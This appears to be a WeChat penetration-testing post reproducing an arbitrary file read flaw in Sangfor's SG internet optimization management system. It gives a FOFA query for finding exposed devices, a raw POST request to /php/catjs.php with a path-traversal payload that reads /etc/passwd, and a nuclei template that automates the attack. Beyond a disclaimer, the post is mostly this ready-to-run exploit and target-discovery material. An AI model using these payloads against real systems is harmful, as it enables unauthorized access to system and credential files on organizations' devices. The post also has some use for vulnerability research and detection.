#  *信服SG上网优化管理系统catjs.php任意文件读取

joyboy  [ fly的渗透学习笔记 ](javascript:void\(0\);)

**fly的渗透学习笔记** ![]()

微信号 Forever--Lfy-

功能介绍 渗透笔记

____

___发表于_

收录于合集 #漏洞复现 34个

  

**一、免责声明：**

* * *

 ****

      本次文章仅限个人学习使用，如有非法用途均与作者无关，且行且珍惜；由于传播、利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号望雪阁及作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除整改并向您致以歉意。谢谢！

  

 **二、产品介绍：**

* * *

 ****

![]()

 ** **三、资产梳理：****

* * *

 ** ******

fofa:  title="SANGFOR上网优化管理"

 ** ** **四、漏洞复现：******

![]()

 ** ** ** **五、POC：********

* * *

 ** ** ** **********

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    POST /php/catjs.php HTTP/1.1Host: ipUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: noneSec-Fetch-User: ?1Te: trailersConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 35  
    ["../../../../../../../etc/passwd"]

 ** ** ** **********

 ** ** ** **nuclei poc：  
********

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
     id: sangfor_SG  
    info:  name: sangfor_SG readFile  author: joyboy  severity: high  description: |    SANGFOR 深信服SG上网优化管理系统  reference:    - https://  classification:    cvss-metrics:     cvss-score:     cve-id:   metadata:    max-request: 1    fofa-query: title="SANGFOR上网优化管理"    verified: "true"  tags: 任意文件读取  
    http:  - raw:      - |        POST /php/catjs.php HTTP/1.1        Host: {{Hostname}}        Content-Type: application/x-www-form-urlencoded  
            ["../../../../../../../etc/passwd"]  
        matchers-condition: and    matchers:      - type: word        part: body        words:          - "root:"        condition: and  
          - type: status        status:          - 200  
    

 ** ** ** **********

![]()

  

  

  

预览时标签不可点

微信扫一扫  
关注该公众号

轻触阅读原文

继续滑动看下一个

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

